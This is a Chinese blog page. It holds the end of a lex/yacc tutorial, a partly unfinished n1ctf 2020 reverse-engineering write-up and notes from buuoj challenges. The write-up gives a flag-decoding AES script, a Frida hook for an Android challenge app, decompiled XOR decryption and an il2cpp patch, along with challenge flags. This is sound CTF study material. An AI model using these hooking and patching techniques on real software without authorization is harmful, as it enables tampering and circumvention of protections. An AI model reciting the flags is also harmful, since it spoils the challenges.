<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在lex.yy.c里定义，会被yyparse()调用。在此声明消除编译和链接错误。</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 在此声明，消除yacc生成代码时的告警</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">yyparse</span><span class="params">(<span class="keyword">void</span>)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数在y.tab.c里会被调用，需要在此定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[error] %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	yyparse();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%token NUMBER TOKHEAT STATE TOKTARGET TOKTEMPERATURE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">commands: <span class="comment">/* empty */</span></span><br><span class="line">| commands command</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">command: heat_switch | target_set ;</span><br><span class="line"></span><br><span class="line">heat_switch:</span><br><span class="line">TOKHEAT STATE</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned on or off\n&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">target_set:</span><br><span class="line">TOKTARGET TOKTEMPERATURE NUMBER</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\tTemperature set\n&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<p>编译运行这个程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lex a.l</span><br><span class="line">yacc -d a.y # 增加-d选项以生成y.tab.h</span><br><span class="line">cc lex.yy.c y.tab.c -o a</span><br></pre></td></tr></table></figure>
<p>现在为止，已经具备一个编译器的基本单元。但是考虑这个问题：lex识别了一个标识符，但是C语言中不同的标识符有不同的含义，所以还需要为它生成一个ID，为语义分析做准备。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;y.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"><span class="comment">// yytext指识别到的语句，yyval用来向yacc传递值</span></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+ yylval = atoi(yytext); <span class="keyword">return</span> NUMBER;</span><br><span class="line">heat <span class="keyword">return</span> TOKHEAT;</span><br><span class="line">on|off yylval = !<span class="built_in">strcmp</span>(yytext, <span class="string">&quot;on&quot;</span>); <span class="keyword">return</span> STATE;</span><br><span class="line">target <span class="keyword">return</span> TOKTARGET;</span><br><span class="line">temperature <span class="keyword">return</span> TOKTEMPERATURE;</span><br><span class="line">\n <span class="comment">/* ignore end of line */</span></span><br><span class="line">[ \t]+ <span class="comment">/* ignore whitespace */</span></span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<p>yacc规则中也需要做出一些更改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">target_set:</span><br><span class="line">TOKTARGET TOKTEMPERATURE NUMBER</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\tTemperature set to %d\n&quot;</span>, $<span class="number">3</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// $3表示这个语法的第三个单元中的参数</span></span><br><span class="line">heat_switch:</span><br><span class="line">TOKHEAT STATE</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned on\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned off\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $2表示这个语法中第二个单元的参数</span></span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143867739">Lex与YACC详解 - Deepliu的文章 - 知乎</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-writeup/n1ctf2020/wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/20/writeup/n1ctf2020/wp/" class="article-date">
  	<time datetime="2020-10-20T05:59:47.000Z" itemprop="datePublished">2020-10-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/20/writeup/n1ctf2020/wp/">
        n1ctf 2020 逆向wp
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>// TODO</p>
<h2 id="easyapk"><a href="#easyapk" class="headerlink" title="easyapk"></a>easyapk</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;n1ctf&#123;17b87f9aae8933ef&#x27;</span></span><br><span class="line">print(s+<span class="string">&#x27;a&#x27;</span>*(<span class="number">38</span>-len(s))+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">print(len(s)<span class="number">-6</span>)</span><br><span class="line">a = <span class="string">&#x27;jZe3yJG3zJLHywu4otmZzwy&#x27;</span></span><br><span class="line">tab = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-&#x27;</span></span><br><span class="line">rtab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    d[tab[i]] = rtab[i]</span><br><span class="line">ra = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    ra+=d[i]</span><br><span class="line">ra+=<span class="string">&#x27;=&#x27;</span></span><br><span class="line">flag1 = base64.b64decode(ra.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;flag1:&#x27;</span>,flag1)</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;17b87f9aae8933ef&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\&#x27;17b87f9aae8933efn1ctf&#123;&#125;&#x27;</span></span><br><span class="line">cipher = bytes([<span class="number">0xA5</span>, <span class="number">0xA4</span>, <span class="number">0x4C</span>, <span class="number">0xD</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x1E</span>, <span class="number">0x63</span>, <span class="number">0x54</span>, <span class="number">0xC5</span>, <span class="number">0x29</span>, <span class="number">0xFA</span>,<span class="number">0xE4</span>, <span class="number">0xEC</span>, <span class="number">0x1F</span>, <span class="number">0x27</span>,<span class="number">0x52</span>, <span class="number">0xD2</span>, <span class="number">0xF1</span>, <span class="number">0xB7</span>, <span class="number">0xE4</span>, <span class="number">0x1C</span>, <span class="number">0x61</span>, <span class="number">0x42</span>, <span class="number">0x77</span>, <span class="number">0x9F</span>, <span class="number">0x5D</span>, <span class="number">0xA1</span>, <span class="number">0x87</span>, <span class="number">0xA</span>, <span class="number">0xEC</span>, <span class="number">0x55</span>])</span><br><span class="line">aes = AES.new(mode=AES.MODE_CBC,iv=iv,key=key)</span><br><span class="line"><span class="comment"># 03b5029f16f7e605</span></span><br><span class="line">print(aes.decrypt(cipher))</span><br><span class="line">print(<span class="string">&#x27;n1ctf&#123;&#x27;</span>+str(flag1,encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">&#x27;03b5029f16f7e605&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>hook脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message,data</span>):</span></span><br><span class="line">    print(message)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>]==<span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[*] &#123;0&#125;&#x27;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jscode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;1.jsx&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jscode = f.read()</span><br><span class="line">    p = frida.get_usb_device().attach(<span class="string">&#x27;com.nu1l.ctf&#x27;</span>)</span><br><span class="line">    script = p.create_script(jscode)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>,on_message)</span><br><span class="line">    script.load()</span><br><span class="line">    sys.stdin.read()</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_string</span>(<span class="params">offset</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = Process.findModuleByName(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> base = <span class="built_in">module</span>.base;</span><br><span class="line">    <span class="built_in">console</span>.log(ptr(base.add(ptr(offset))).readCString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_native</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = Process.findModuleByName(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> base = <span class="built_in">module</span>.base;</span><br><span class="line">    <span class="keyword">var</span> sub_12930 = base.add(<span class="number">0x12930</span>);</span><br><span class="line">    Interceptor.attach(sub_12930, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.arg0 = args[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_12930 onEnter:&quot;</span>, hexdump(<span class="built_in">this</span>.arg0), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_12930 onLeave:&quot;</span>, hexdump(retval));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> sub_122A0 = base.add(<span class="number">0x122A0</span>);</span><br><span class="line">    Interceptor.attach(sub_122A0, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.arg0 = args[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">this</span>.arg1 = args[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">this</span>.arg2 = args[<span class="number">2</span>]</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_122A0 onEnter: &quot;</span>,ptr(<span class="built_in">this</span>.arg0).readCString(),ptr(<span class="built_in">this</span>.arg1).readCString(),ptr(<span class="built_in">this</span>.arg2).readCString())</span><br><span class="line">&#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;sub_122A0 onLeave:&quot;</span>, hexdump(retval))</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    hook_native();</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>
<h2 id="Oh-my-julia"><a href="#Oh-my-julia" class="headerlink" title="Oh my julia"></a>Oh my julia</h2><blockquote>
<p>对于JIT型语言的技巧，就是找到编译后的代码</p>
<ol>
<li><p>当程序要求输入时断下</p>
</li>
<li><p>单步执行直到程序输出东西</p>
</li>
<li><p>在输入/常量flag部分下硬件断点</p>
</li>
</ol>
<p>之后就可以把编译后的代码dump下来用于后续分析</p>
</blockquote>
<p>// TODO 果然还是基本功，先做点简单的</p>
<h2 id="BabyOS"><a href="#BabyOS" class="headerlink" title="BabyOS"></a>BabyOS</h2><h3 id="binwalk使用指南"><a href="#binwalk使用指南" class="headerlink" title="binwalk使用指南"></a>binwalk使用指南</h3><ul>
<li><p>查看固件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压压缩包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 文件名 # 解压压缩包</span><br><span class="line">binwalk -eM -d depth 文件名 # M表示递归解压，depth为深度，不指定默认为8</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压指定类型文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e -D=type 文件名 # type是要解压的类型，我已知的elf,jpeg</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p><a target="_blank" rel="noopener" href="https://github.com/hzcx998/xbook2">xbook2</a>操作系统是一个大学生写的，tqlOrzzzzzz。这个操作系统的信息可以使用strings看出来，其中有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1564: D:&#x2F;Developmemts&#x2F;github&#x2F;xbook2&#x2F;src&#x2F;include&#x2F;xbook&#x2F;schedule.h</span><br></pre></td></tr></table></figure>
<p>从而找到这个操作系统相关的信息</p>
<p>运行操作系统，列出文件，发现一个n1ctf程序，可以运行。这个程序位于xbook2-file1.img，使用binwalk解出来</p>
<p>但是程序似乎是加密的。</p>
<p>使用binwalk扫第一个a.img，解出一个程序，丢进IDA，发现这是一个操作系统程序(因为看见kernel等字样了)</p>
<p>然后找到一个do_execute函数，这个函数里面发现了加密逻辑。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">v7 = sys_open(v17, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v19 = sys_open(<span class="string">&quot;/tmp/decrypt&quot;</span>, <span class="number">28</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v19 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sys_lseek(v7, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    sys_lseek(v7, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v9 = kmalloc(v8);</span><br><span class="line">    v10 = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sys_read(v7, v9, v8) == v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = <span class="built_in">strlen</span>(<span class="string">&quot;xpawqejc4654wqqwe123%#%3213&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v10 + v13) ^= aXpawqejc4654wq[v13 % v12] ^ (<span class="keyword">unsigned</span> __int8)v13;</span><br><span class="line">            ++v13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v13 != v8 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( sys_write(v19, v10, v8) == v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          kfree(v10);</span><br><span class="line">          sys_close(v19);</span><br><span class="line">          sys_close(v7);</span><br><span class="line">          v14 = sys_open(<span class="string">&quot;/tmp/decrypt&quot;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v14 &gt;= <span class="number">0</span> )用</span><br></pre></td></tr></table></figure>
<p>使用这个解密出n1ctf程序</p>
<h3 id="n1ctf程序"><a href="#n1ctf程序" class="headerlink" title="n1ctf程序"></a>n1ctf程序</h3><p>// TODO</p>
<h2 id="BabyCompiler"><a href="#BabyCompiler" class="headerlink" title="BabyCompiler"></a>BabyCompiler</h2><p>// TODO</p>
<h2 id="Fixed-Camera"><a href="#Fixed-Camera" class="headerlink" title="Fixed Camera"></a>Fixed Camera</h2><p>是一个il2cpp程序</p>
<p>il2cpp编译后的逻辑位于GameAssembly.dll中，但是不知道函数都是啥，而且函数很多。</p>
<p>使用il2cppdump解出Assembly-Csharp.dll，可以找到函数的函数名和VA，再回头看GameAssembly.dll，可以分析。</p>
<p>patch cam的Update函数，把负数的限制扩大，然后就可以获得flag了</p>
<p>在移动过程中可能有加密，但是到-50时出现flag</p>
<p><code>n1ctf&#123;enbrypt_value&#125;</code></p>
<h2 id="rrr"><a href="#rrr" class="headerlink" title="rrr"></a>rrr</h2><p>// 此题看不懂</p>
<h2 id="N1vault"><a href="#N1vault" class="headerlink" title="N1vault"></a>N1vault</h2><p>// TODO</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/buuoj-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/18/note/rev/buuoj-1/" class="article-date">
  	<time datetime="2020-10-18T11:05:12.000Z" itemprop="datePublished">2020-10-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/18/note/rev/buuoj-1/">
        buuoj中学到的东西--键盘扫描码
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="键盘扫描码"><a href="#键盘扫描码" class="headerlink" title="键盘扫描码"></a>键盘扫描码</h2><p>问题来源于逆向题BabyDirver</p>
<p>这道题本来是迷宫问题，判断条件是37,38。这里是键盘扫描码，和ascii码不同。</p>
<p>注意驱动中的编码问题。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43876357/article/details/108523865">buuoj-babydriver</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://www.supfree.net/search.asp?id=6386">键盘扫描码</a></p>
<h2 id="二叉树的还原"><a href="#二叉树的还原" class="headerlink" title="二叉树的还原"></a>二叉树的还原</h2><p>问题来自于buuoj[2019红帽杯]childRE</p>
<p>二叉树，给定先序和中序遍历，还原过程如下</p>
<p>先序遍历中，根节点总是第一个遍历，找到根节点之后就可以在中序遍历中分开左右子树节点。在左右子树中分别应用这个规律。</p>
<p>给定后续遍历时，根节点总是最后一个被遍历，还原过程和先序遍历类似</p>
<h2 id="MSVC预定义宏"><a href="#MSVC预定义宏" class="headerlink" title="MSVC预定义宏"></a>MSVC预定义宏</h2><p><strong>FUNCDNAME</strong>定义为封闭函数修饰名的字符串文本，这个宏只在函数中定义</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Demonstrates functionality of __FUNCTION__, __FUNCDNAME__, and __FUNCSIG__ macros</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exampleFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function name: %s\n&quot;</span>, __FUNCTION__);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decorated function name: %s\n&quot;</span>, __FUNCDNAME__);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function signature: %s\n&quot;</span>, __FUNCSIG__);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sample Output</span></span><br><span class="line">    <span class="comment">// -------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Function name: exampleFunction</span></span><br><span class="line">    <span class="comment">// Decorated function name: ?exampleFunction@@YAXXZ</span></span><br><span class="line">    <span class="comment">// Function signature: void __cdecl exampleFunction(void)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以用UnDecorateSymbolName进行反修饰得到函数签名</p>
<p>修饰名是链接器用于查找方法使用的</p>
<p>参考资料 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/preprocessor/predefined-macros?view=vs-2019">预定义宏 | Microsoft Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/build/reference/decorated-names?view=vs-2019">修饰名 | Microsoft Docs</a></p>
<h2 id="bool类型比较和赋值"><a href="#bool类型比较和赋值" class="headerlink" title="bool类型比较和赋值"></a>bool类型比较和赋值</h2><p>示例代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">bool</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a==b); <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>汇编代码</p>
